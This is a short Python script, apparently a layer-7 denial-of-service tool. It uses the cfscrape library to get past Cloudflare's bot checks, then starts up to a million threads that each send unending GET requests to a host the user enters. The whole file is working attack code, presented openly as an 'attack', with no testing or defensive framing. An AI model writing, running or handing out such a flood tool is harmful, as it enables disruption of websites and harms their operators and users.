import cfscrape,threading

allready_connected = 0
cfr = cfscrape.create_scraper()

print(" ")
print("MUST USE HTTP/HTTPS")
h1 = input("Host: ")
print("\n")
print("SEND PACKET TO",h1)
print(" ")
print("CTRL-Z TO EXIT")
def attack():
	while True:
		cfr.get(""+h1+"")
		global allready_connected
		allready_connected += 1

for i in range(1000000):
	thread = threading.Thread(target=attack)
	thread.start()
